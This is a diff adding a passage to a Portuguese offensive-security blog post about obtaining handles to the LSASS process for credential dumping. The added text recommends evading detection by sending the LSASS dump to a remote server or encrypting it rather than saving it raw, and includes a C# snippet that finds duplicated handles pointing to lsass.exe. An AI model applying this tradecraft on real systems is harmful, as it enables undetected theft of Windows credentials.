@@ -461,6 +461,21 @@ E, finalmente! Temos um handle pro LSASS! Vamos pausar a execução do código e
 
 ![Desktop View](https://blackmetal2000.github.io/assets/img/open-handles/g8SRVNL.png)
 
+> Uma boa prática para evasão seria de não armazenar o arquivo do dump puro no disco. Ao invés disso, enviá-lo a algum servidor de destino ou criptografar o conteúdo do dump antes de salvá-lo. Tais práticas evitam a detecção por assinatura de arquivos DMP do LSASS.
+```csharp
+if (pathExe.Equals("Process", StringComparison.OrdinalIgnoreCase))
+{
+	if (Netdump.Invokes.QueryFullProcessImageName(hDuplicate, 0, fileNameBuilder, ref bufferLength))
+	{
+		if (fileNameBuilder.ToString().EndsWith("lsass.exe"))
+		{
+			Console.WriteLine($"[+] {hexValue}, PID: {Netdump.Invokes.GetProcessId(hDuplicate)}, Path: {fileNameBuilder.ToString()}");
+		}
+	}
+}
+```
+{: .prompt-tip }
+
 ## MiniDumpWriteDump¹³
 
 >`MiniDumpWriteDump¹³`: API utilizada para realizar o dump de um processo. Comumente utilizada em ataques ao LSASS.
